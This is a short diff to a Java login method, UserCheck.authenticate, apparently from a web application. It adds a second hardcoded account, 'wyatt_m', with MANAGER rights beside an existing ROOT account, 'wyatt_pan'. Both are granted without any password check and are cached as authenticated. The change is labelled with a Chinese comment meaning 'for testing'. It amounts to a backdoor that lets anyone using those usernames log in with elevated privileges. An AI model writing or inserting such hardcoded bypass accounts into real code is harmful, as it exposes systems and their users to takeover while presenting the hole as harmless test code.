@@ -15,15 +15,18 @@ public class UserCheck extends Secure.Security {
 
     static boolean authenticate(String username, String password) {
         User user = null;
+        // 测试用
         if(username.equals("wyatt_pan")) {
             user = new User("wyatt_pan", "empty");
             user.power = User.P.ROOT;
-            Cache.add(ukey(username), user);
+        } else if(username.equals("wyatt_m")) {
+            user = new User("wyatt_m", "empty");
+            user.power = User.P.MANAGER;
         }
         if(user == null) {
             user = User.connect(username, password);
-            if(user != null) Cache.add(ukey(username), user);
         }
+        if(user != null) Cache.add(ukey(username), user);
         return user != null;
     }
 
